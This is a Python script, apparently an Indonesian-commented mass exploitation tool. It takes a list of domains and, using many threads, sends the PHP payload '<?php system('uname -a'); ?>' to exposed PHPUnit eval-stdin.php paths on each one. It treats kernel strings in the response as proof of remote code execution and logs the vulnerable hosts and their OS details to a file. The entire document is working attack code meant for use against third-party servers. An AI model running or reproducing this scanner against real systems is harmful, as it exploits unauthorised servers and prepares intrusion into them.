import requests
import argparse
import os
import urllib3
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GR = Fore.GREEN
WH = Fore.WHITE
CY = Fore.CYAN
RE = Fore.RED

def sikat_phpunit(target, pbar):
    domain = target.strip().replace('http://', '').replace('https://', '').rstrip('/')
    paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/phpunit/src/Util/PHP/eval-stdin.php"
    ]
    payload = "<?php system('uname -a'); ?>"
    
    for path in paths:
        url = f"https://{domain}{path}"
        try:
            res = requests.post(url, data=payload, verify=False, timeout=10)
            body = res.text.strip()
            
            # Validasi kernel & Filter framework (Laravel/Drupal/Kohana)
            # Filter 
            is_vuln = any(x in body for x in ["Linux", "x86_64", "Darwin", "GNU/Linux"])
            blacklist = [
                "<html", "<style", "Kohana", "Exception", "script type", 
                "Laravel", "Symfony", "Drupal", "<?php", "bootstrap", 
                "vendor/composer", "Fatal error", "Deprecated", "Warning:"
            ]
            is_fake = any(x in body for x in blacklist)

            if is_vuln and not is_fake:
                # pbar.write 
                pbar.write(f"{GR}[+] VULN -> {url}")
                pbar.write(f"{WH}    OS INFO: {body}\n")
                
                with open('phpunit_pro_results.txt', 'a') as f:
                    f.write(f"[+] {url}\n    {body}\n\n")
                break 

        except:
            pass
    
    # Update progress bar
    pbar.update(1)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", required=True)
    parser.add_argument("-t", "--threads", type=int, default=20)
    args = parser.parse_args()

    if not os.path.exists(args.list): return

    with open(args.list, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"{CY}[*] Memproses {len(targets)} target dengan Progress Bar...\n")

    # Inisialisasi Progress Bar
    # Format: [ Progress ] % | Done/Total
    with tqdm(total=len(targets), desc=f"{CY}Scanning{Style.RESET_ALL}", unit="target", bar_format="{l_bar}{bar:20}{r_bar}") as pbar:
        pool = ThreadPool(args.threads)
        # Kirim pbar ke fungsi 
        pool.map(lambda d: sikat_phpunit(d, pbar), targets)
        pool.close()
        pool.join()

    print(f"\n{CY}[*] Selesai! Cek: phpunit_pro_results.txt")

if __name__ == "__main__":
    main()
